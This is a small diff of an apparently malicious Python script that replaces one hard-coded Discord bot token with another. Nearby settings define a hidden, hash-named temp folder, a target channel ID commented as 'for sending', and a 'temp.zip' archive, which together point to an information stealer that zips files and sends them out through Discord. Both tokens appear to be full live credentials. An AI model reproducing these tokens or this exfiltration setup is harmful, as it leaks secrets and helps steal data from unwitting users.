@@ -38,7 +38,7 @@ if platform.system() == "Windows":
 else:
     TMP_DIR = "." + generate_sha256_like_name()
 
-DISCORD_BOT_TOKEN = "MTM4OTMwMjc1MTgxNjg0MzQwNQ.G5AMe7.MgASBR1rXM-JUSnSLv3Rnbe9RHbrbvRZzZnMTY"  # Токен вашего Discord-бота
+DISCORD_BOT_TOKEN = "MTM4OTMwMjc1MTgxNjg0MzQwNQ.GYrNV6.ofbeToaM0cCEDs-XXZN21NNXz7SA3vZWSZdl3s"  # Токен вашего Discord-бота
 DISCORD_CHANNEL_ID = 1389291865668456491  # ID канала для отправки
 ZIP_NAME = "temp.zip"
 
